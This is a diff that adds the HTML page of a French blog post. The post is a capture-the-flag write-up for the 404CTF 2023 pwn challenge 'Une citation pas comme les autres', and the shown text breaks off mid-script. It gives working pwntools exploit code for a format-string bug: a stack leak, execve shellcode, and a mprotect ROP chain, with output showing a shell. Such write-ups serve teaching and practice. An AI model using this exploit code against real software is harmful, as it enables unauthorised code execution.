@@ -1,0 +1,1111 @@
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta
+    name="description"
+    content="Author: Kien Nguyen <kiennt2609@gmail.com>
+      A minimal Hugo theme with Tailwind CSS"
+  />
+  <title>
+    
+      Blog de TaylorDeDordogne
+      | Une citation pas comme les autres
+    
+  </title>
+  <meta name="author" content="map[email:taylordedordogne@gmail.com name:TaylorDeDordogne]" />
+  <meta name="description" content="" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <link
+    rel="icon"
+    href="/favicon_io/favicon.ico"
+    type="image/x-icon"
+  />
+  <link
+    rel="icon"
+    href="/favicon_io/favicon-16x16.png"
+    size="16x16"
+    type="image/png"
+  />
+  <link
+    rel="icon"
+    href="/favicon_io/favicon-32x32.png"
+    size="32x32"
+    type="image/png"
+  />
+
+  <link
+    rel="preload"
+    type="text/css"
+    href="/css/rose-pine.min.css"
+    integrity=""
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="/css/rose-pine.min.css"
+      integrity=""
+    />
+  </noscript>
+<link
+    rel="preload"
+    type="text/css"
+    href="/css/toigian.css"
+    integrity=""
+    as="style"
+    onload="this.onload=null;this.rel='stylesheet'"
+  />
+  <noscript>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="/css/toigian.css"
+      integrity=""
+    />
+  </noscript>
+
+  
+  <link
+    rel="stylesheet"
+    type="text/css"
+    href="/css/light.css"
+    integrity=""
+  />
+  <link
+    rel="stylesheet"
+    type="text/css"
+    href="/css/dark.css"
+    integrity=""
+  />
+
+  <script>
+    
+    if (
+      localStorage.theme === "dark" ||
+      (!("theme" in localStorage) &&
+        window.matchMedia("(prefers-color-scheme: dark)").matches)
+    ) {
+      document.documentElement.classList.add("dark");
+    } else {
+      document.documentElement.classList.remove("dark");
+    }
+  </script>
+
+  
+  
+  <script
+    async
+    defer
+    src="/js/main.js"
+    integrity=""
+  ></script>
+  <script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+  <script>
+    mermaid.initialize({ startOnLoad: true, securityLevel: "loose" });
+  </script>
+  
+  
+</head>
+<body><header style="--layer: 10">
+  <div
+    aria-hidden="true"
+    class="absolute top-[-1000px] left-0 z-[calc(var(--layer)+1)] h-[calc(1000px+var(--page-top))] w-full bg-base"
+  ></div>
+
+  <div
+    class="fixed top-0 left-0 z-[var(--layer)] flex h-header-height w-full items-center border-b px-page-gutter before:absolute before:inset-0 before:z-[-1] before:bg-base [@supports(backdrop-filter:blur(0))]:before:bg-base [@supports(backdrop-filter:blur(0))]:before:backdrop-blur-md"
+  ><div
+  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
+>
+  <nav class="mr-3">
+    <ol class="flex text-md items-center">
+      
+  
+    
+  
+    
+  
+  
+  
+  <li>
+    
+    
+    <a href="/" class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">Blog de TaylorDeDordogne</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">/</li>
+  
+
+  
+  
+  
+  <li>
+    
+    
+    <a href="/posts/" class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">Posts</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">/</li>
+  
+
+  
+  
+  
+    
+  
+  <li>
+    
+    
+    <a href="/posts/une-citation-pas-comme-les-autres/" class="focus:underline focus:outline-none font-bold pr-1 hidden md:block">Une citation pas comme les autres</a>
+  </li>
+  
+
+    </ol>
+  </nav>
+  <nav class="ml-3">
+    <ul class="flex text-md whitespace-nowrap">
+      
+    </ul>
+  </nav>
+</div>
+
+
+</div>
+</header>
+<main class="flex justify-center px-page-gutter py-page-top">
+      <div class="min-h-content w-full max-w-content space-y-10 sm:space-y-20"><div
+  class="lowercase italic mx-auto flex w-full max-w-content items-center justify-between"
+>
+  <nav class="mr-3">
+    <ol class="flex text-md items-center">
+      
+  
+    
+  
+    
+  
+  
+  
+  <li>
+    
+    
+    <a href="/" class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">Blog de TaylorDeDordogne</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">/</li>
+  
+
+  
+  
+  
+  <li>
+    
+    
+    <a href="/posts/" class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">Posts</a>
+  </li>
+  
+    <li class="text-muted focus:underline focus:outline-none pr-1 whitespace-nowrap">/</li>
+  
+
+  
+  
+  
+    
+  
+  <li>
+    
+    
+    <a href="/posts/une-citation-pas-comme-les-autres/" class="focus:underline focus:outline-none font-bold pr-1 hidden md:block">Une citation pas comme les autres</a>
+  </li>
+  
+
+    </ol>
+  </nav>
+  <nav class="ml-3">
+    <ul class="flex text-md whitespace-nowrap">
+      
+    </ul>
+  </nav>
+</div>
+
+
+<article>
+  <h1>Une citation pas comme les autres</h1>
+  <time class="text-sm italic tabular-nums text-muted"
+  >2023/06/10&nbsp;</time
+>
+
+  
+
+  
+    <div class="section">
+      
+        
+        <a href="/tags/pwn/" id="tag">PWN</a>
+      
+        
+        <a href="/tags/404ctf-2023/" id="tag">404CTF 2023</a>
+      
+    </div>
+  
+
+
+<div id="toc">
+  
+    
+      <details open>
+        <summary>Table of contents</summary>
+        <div id="toc-list"><nav id="TableOfContents">
+  <ol>
+    <li><a href="#introduction">Introduction</a>
+      <ol>
+        <li><a href="#première-partie">Première partie</a>
+          <ol>
+            <li><a href="#unintended-way">Unintended Way</a></li>
+            <li><a href="#intended-way">Intended Way</a></li>
+          </ol>
+        </li>
+        <li><a href="#seconde-partie">Seconde partie</a></li>
+        <li><a href="#leak-de-la-libc-et-du-binaire">Leak de la libc et du binaire</a></li>
+        <li><a href="#obtention-du-shell">Obtention du shell</a></li>
+      </ol>
+    </li>
+    <li><a href="#scripts-de-solve-complets">Scripts de solve complets</a></li>
+  </ol>
+</nav></div>
+      </details>
+    
+  
+</div>
+<div class="content"><h2 id="introduction">Introduction</h2>
+<p>Ce challenge de PWN se divisait en deux parties, les deux nous demandaient d&rsquo;exploiter des <code>format strings</code>, mais à cause d&rsquo;une imprécision dans l&rsquo;énoncé de la première partie j&rsquo;ai fait pop un shell sans que cela soit nécessaire 🤡. Pour cette partie je vais donc détailler les deux manières que j&rsquo;ai utilisé pour exploiter le binaire! L&rsquo;énoncé se présentait comme ceci:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Un coin lecture rempli de nombreux livres est à la disposition des clients. En parcourant les étagères, vous tombez sur un livre qui semble être un recueil de citations.
+</span></span><span class="line"><span class="cl">En l&#39;ouvrant, vous découvrez qu&#39;il est manuscrit et rassemble des citations de toutes sortes.
+</span></span><span class="line"><span class="cl">En lisant la préface, vous réalisez qu&#39;il est possible d&#39;ajouter vos propres citations au livre.
+</span></span><span class="line"><span class="cl">Que décidez-vous de faire ?
+</span></span></code></pre></div><h3 id="première-partie">Première partie</h3>
+<h4 id="unintended-way">Unintended Way</h4>
+<p>Comme d&rsquo;habitude, on lance un <code>file</code> pour en savoir plus sur le binaire et un <code>checksec</code> pour voir quelles protection le binaire utilise:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">citation: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=8dc288d4fcf863f23a2d6094765775bb3c4330d3, for GNU/Linux 4.4.0, not stripped
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
+</span></span><span class="line"><span class="cl">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   2193 Symbols      No    0               0               /home/kali/Desktop/404_Heap/citation
+</span></span></code></pre></div><p>Ok, on a un binaire non strippé sans <code>PIE</code> avec l&rsquo;<code>ASLR</code> et la <code>NX</code> activé et les <code>relocations</code> ne sont pas en Read-Only.</p>
+<p>Le fait que le binaire soit statiquement linké va nous rendre l&rsquo;exploitation plus difficile dans le sens où aucune librairie ne sera présente dans le processus et que la fonction <code>system</code> n&rsquo;est pas linké dans le programme mais d&rsquo;un autre côté cela devrait nous proposer beaucoup plus de gadgets à trouver 😈.</p>
+<p>Commeçons par analyser le programme! Ce dernier va nous demander de choisir parmis trois options:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Vous vous retrouvez face au livre.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">1: Lire une citation
+</span></span><span class="line"><span class="cl">2: Ecrire sur le livre
+</span></span><span class="line"><span class="cl">3: Compter le nombre de citations
+</span></span><span class="line"><span class="cl">4: Fermer le livre
+</span></span></code></pre></div><p>Si on regarde dans le code décompilé de ce à quoi elles correspondent voilà ce qu&rsquo;on peut en tirer:</p>
+<ul>
+<li><strong>pick_quote</strong> Cette fonction va ouvrir un fichier <code>citations.txt</code> (présent sur le serveur), lister le nombre de citations N puis choisir un nombre aléatoire modulo N - 1 (oui pas N, mais N - 1 ca aura son importance dans la Intended Way) et afficher cette citation.</li>
+<li><strong>write_quote</strong> Cette fonction va lire une entrée utilisateur depuis <code>stdin</code>, la réafficher sans rien faire d&rsquo;autre:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Que souhaitez-vous écrire ?
+</span></span><span class="line"><span class="cl">[Vous] : ABCD
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Au moment où vous vous apprêtiez à écrire : ABCD
+</span></span><span class="line"><span class="cl">Vous remarquez des traces d&#39;une citation qui semble avoir été effacée.
+</span></span><span class="line"><span class="cl">Vous vous ravisez temporairement d&#39;écrire sur le livre en attendant d&#39;en savoir davantage.
+</span></span></code></pre></div><ul>
+<li><strong>count_quotes</strong> va simplement afficher du texte afficher du texte, impossible d&rsquo;avoir réellement le bon nombre de citations.</li>
+<li><strong>exit</strong> va faire quitter le programme.</li>
+</ul>
+<p>La vulnérabilité se trouvant dans la fonction <code>write_quote</code>, l&rsquo;entrée de l&rsquo;utilisateur est directement réfléchie par <code>printf</code> sans l&rsquo;usage d&rsquo;une chaine de format, on est bien en face d&rsquo;une format string! On peut d&rsquo;ailleurs leak le contenu de la stack comme ceci:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[Vous] : %p%p%p%p
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Au moment où vous vous apprêtiez à écrire : 0x7ffcd08140f0(nil)(nil)0x20995d9
+</span></span><span class="line"><span class="cl">Vous remarquez des traces d&#39;une citation qui semble avoir été effacée.
+</span></span><span class="line"><span class="cl">Vous vous ravisez temporairement d&#39;écrire sur le livre en attendant d&#39;en savoir davantage.
+</span></span></code></pre></div><p>Maintenant il faut trouver une manière d&rsquo;exploiter cette vulnérabilité: On sait que le PIE n&rsquo;est pas activé et que même si le binaire est linké statiquement avec la NX activé, la fonction <code>mprotect</code> est linké dans le binaire. On peut donc grâce à la primitive de <code>Write What Where</code> permise par la format string, écrire une <code>ROPchain</code> sur la stack qui fera ceci:</p>
+<ul>
+<li>Copier un shellcode au début de la .bss</li>
+<li>Mprotect la première page de la .bss en RWX</li>
+<li>Sauter sur le shellcode</li>
+</ul>
+<p>Mais pour ca il va nous falloir un leak de la stack pour pouvoir bien positionner le début de notre ropchain sur la valeur sauvegardée de <code>RIP.</code></p>
+<h5 id="leak-de-la-stack">Leak de la stack</h5>
+<p>Après avoir leak quelques adresses, on se rend compte que la première disposée sur la stack après l&rsquo;appel à printf vaut est telle que: <code>&lt;saved RIP&gt; - 1448</code>. On obtient donc assez facilement notre leak</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Leaking return address</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rip_offset</span> <span class="o">=</span> <span class="mi">1448</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_fmt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Leaking stack address&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">write_fmt</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;%p&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;crire : &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">debug</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">debug</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">saved_rip</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">+</span> <span class="n">rip_offset</span>
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Saved RIP @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">saved_rip</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><h5 id="ecriture-du-shellcode">Ecriture du shellcode</h5>
+<p>Pour la suite de l&rsquo;exploitation on va utiliser la fonction <code>fmtstr_payload</code> de pwntools qui permet de grandement faciliter l&rsquo;exploitation des format strings. Nous avons juste à lui passer en paramètre l&rsquo;offset telle que le début de payload se réfléchisse lui même sur la stack, et un dictionnaire de cette forme: <code>{'where':'what',}</code>. On peut déterminer facilement l&rsquo;offset nécessaire comme ceci:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Que souhaitez-vous écrire ?
+</span></span><span class="line"><span class="cl">[Vous] : %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Au moment où vous vous apprêtiez à écrire : 0x7ffddbdbe4d0(nil)(nil)0x1b835f5(nil)0x70257025702570250x70257025702570250x70257025702570250x70257025702570250xa70257025(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)
+</span></span><span class="line"><span class="cl">Vous remarquez des traces d&#39;une citation qui semble avoir été effacée.
+</span></span><span class="line"><span class="cl">Vous vous ravisez temporairement d&#39;écrire sur le livre en attendant d&#39;en savoir davantage.
+</span></span></code></pre></div><p>On voit que le début de notre chaine de <code>%p</code> se trouve à l&rsquo;offset 6 sur la stack!
+Vu que le PIE n&rsquo;est pas activé, l&rsquo;adresse de la .bss ne change jamais, on aura donc pas besoin de leak l&rsquo;adresse du binaire pour écrire notre shellcode. Pour que mprotect fonctionne, il faut que l&rsquo;adresse que l&rsquo;on va lui passer soit aligné sur la taille d&rsquo;une page (<code>4096</code>):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">align_ptr</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">addr</span><span class="p">:</span> <span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="mi">4095</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mi">4095</span>
+</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">buffer_fmt_offset</span> <span class="o">=</span> <span class="mi">6</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_payload</span><span class="p">(</span><span class="n">area</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">www</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="mi">8</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="n">www</span><span class="p">[</span><span class="n">area</span> <span class="o">+</span> <span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">chunk</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_fmt</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">buffer_fmt_offset</span><span class="p">,</span> <span class="n">www</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Writing shellcode on a .bss section&#39;s page, the `12` is added to avoid the badchar `\n` being present in the format string payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x004bc100</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload_page</span> <span class="o">=</span> <span class="n">align_ptr</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload_area</span> <span class="o">=</span> <span class="n">payload_page</span> <span class="o">+</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Writing shellcode @ </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">payload_area</span><span class="p">)</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_payload</span><span class="p">(</span><span class="n">payload_area</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">)</span>
+</span></span></code></pre></div><h5 id="changement-des-droits-de-la-bss">Changement des droits de la .bss</h5>
+<p>Maintenant il faut utiliser mprotect pour que l&rsquo;endroit où on vient de copier notre shellcode soit exécutable, on va créer une ROPchain à l&rsquo;adresse de la sauvegarde RIP que l&rsquo;on a eu grâce au leak. On va commencer par trouver les gadgets dont on a besoin pour cette ROP:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">ROPgadget --binary citation | grep &#34;pop rdi\|pop rsi\|pop rdx&#34;
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">0x000000000040225d : pop rdi ; ret
+</span></span><span class="line"><span class="cl">0x00000000004128f9 : pop rsi ; ret
+</span></span><span class="line"><span class="cl">0x000000000047ce8b : pop rdx ; pop rbx ; ret
+</span></span><span class="line"><span class="cl">...
+</span></span></code></pre></div><p>Comme prévu, on a le choix, beaucoup de gadgets sont disponibles!</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x000000000040225d</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rsi</span> <span class="o">=</span> <span class="mh">0x00000000004128f9</span>
+</span></span><span class="line"><span class="cl"><span class="n">pop_rdx_rbx</span> <span class="o">=</span> <span class="mh">0x000000000047ce8b</span>
+</span></span><span class="line"><span class="cl"><span class="n">mprotect</span> <span class="o">=</span> <span class="mh">0x000000000042e070</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># Mprotecting the .bss section&#39;s page and jumping on it</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">rop</span> <span class="o">=</span> <span class="p">{</span><span class="n">saved_rip</span> <span class="p">:</span> <span class="n">pop_rdi</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span>  <span class="mi">8</span> <span class="p">:</span> <span class="n">payload_page</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">16</span> <span class="p">:</span> <span class="n">pop_rsi</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">24</span> <span class="p">:</span> <span class="mh">0x1000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">32</span> <span class="p">:</span> <span class="n">pop_rdx_rbx</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">40</span> <span class="p">:</span> <span class="mh">0x7</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">56</span> <span class="p">:</span> <span class="n">mprotect</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">saved_rip</span> <span class="o">+</span> <span class="mi">64</span> <span class="p">:</span> <span class="n">payload_area</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Building Mprotect&#39;s ROP chain and shelling a shell&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">write_fmt</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">fmtstr_payload</span><span class="p">(</span><span class="n">buffer_fmt_offset</span><span class="p">,</span> <span class="n">rop</span><span class="p">))</span>
+</span></span></code></pre></div><p>Et résultat:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">[*] &#39;/home/kali/Desktop/404_Heap/citation&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x400000)
+</span></span><span class="line"><span class="cl">[*] &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    Canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl">[*] &#39;/lib64/ld-linux-x86-64.so.2&#39;
+</span></span><span class="line"><span class="cl">    Arch:     amd64-64-little
+</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
+</span></span><span class="line"><span class="cl">    Stack:    No canary found
+</span></span><span class="line"><span class="cl">    NX:       NX enabled
+</span></span><span class="line"><span class="cl">    PIE:      PIE enabled
+</span></span><span class="line"><span class="cl">[+] Starting local process &#39;/home/kali/Desktop/404_Heap/citation&#39;: pid 1242395
+</span></span><span class="line"><span class="cl">[*] Leaking stack address
+</span></span><span class="line"><span class="cl">[*] Saved RIP @ 0x7ffca5dde4a8
+</span></span><span class="line"><span class="cl">[*] Writing shellcode @ 0x4bd00c
+</span></span><span class="line"><span class="cl">[+] Building Mprotect&#39;s ROP chain and shelling a shell
+</span></span><span class="line"><span class="cl">[*] Switching to interactive mode
+</span></span><span class="line"><span class="cl">Vous remarquez des traces d&#39;une citation qui semble avoir été effacée.
+</span></span><span class="line"><span class="cl">Vous vous ravisez temporairement d&#39;écrire sur le livre en attendant d&#39;en savoir davantage.
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">haa\xb0\xe4ݥ\xfcVous remarquez des traces d&#39;une citation qui semble avoir été effacée.
+</span></span><span class="line"><span class="cl">Vous vous ravisez temporairement d&#39;écrire sur le livre en attendant d&#39;en savoir davantage.
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl">uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),116(scanner),138(wireshark),141(kaboxer)
+</span></span></code></pre></div><p>Nice! Maintenant plus qu&rsquo;à tester en remote&hellip; Et là c&rsquo;est le drame, pas moyen de faire pop, un shell après de longues heures à changer re-changer mon exploit j&rsquo;ai contacté un admin qui m&rsquo;a fait savoir que <code>/bin</code> n&rsquo;était pas monté sur la machine et que par conséquent il fallait passer par un autre moyen pour obtenir le flag.</p>
+<h4 id="intended-way">Intended Way</h4>
+<p>Maintenant on va passer à l&rsquo;exploitation attendue par le challenge, celle ci résidait principalement dans la fonction <code>pick_quote</code>, si vous vous souvenez bien j&rsquo;avais dit qu&rsquo;une citation était prise aléatoirement dans un fichier modulo le nombre de citations -1. C&rsquo;est celà qui m&rsquo;a mis sur la piste: En choisissant un nombre de cette manière la dernière citation ne sera jamais choisie et il doit s&rsquo;agir du flag.</p>
+<p>Intéressons nous plus en détail au code de cette fonction:</p>
+<div>
+    <img src="assets/pick_quote.PNG", style="max-width:100%;margin-left: 50%;transform: translateX(-50%);">
+</div>
+<p>Déjà, les variables <code>num_quotes</code> et <code>chosen_index</code> qui contiennent respectivement le nombre de citations et l&rsquo;index choisi aléatoireemnt sont toutes deux situées dans la .bss, on connait donc à l&rsquo;avance leurs adresses. Mais ce qui est encore plus intéressant c&rsquo;est la comparaison qui est faite sur la variable num_quotes:</p>
+<p>Lors du premier appel à pick_quote, si la variable num_quotes est nulle, alors elle est initializée avec le nombre de citations. Et dans les prochains appesl si elle est supérieure à 0 la variable chosen_index est modifiée par une valeur aléatoire. Mais qu&rsquo;est ce qui se passe si avec notre format string on met la valeur de num_quotes à -1 😛?</p>
+<p>Dans ce cas aucune des conditions n&rsquo;est vérifiés et la valeur de chosen index ne devrait jamais changer, créons un nouveau fichier d&rsquo;exploit avec ctfmate et testons celà tout de suite:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_citation</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&gt;&gt;&gt; &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1: Lire une citation&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="c1"># Vu que les variables de 32 bits `chosen_index` et `num_quotes` sont contigues dans la mémoire, on écrit les deux avec un seul appel</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># à `fmtstr_payload` qui permet d&#39;écrire 64 bits d&#39;un coup</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">chosen_index</span> <span class="o">=</span> <span class="mh">0x004be130</span>
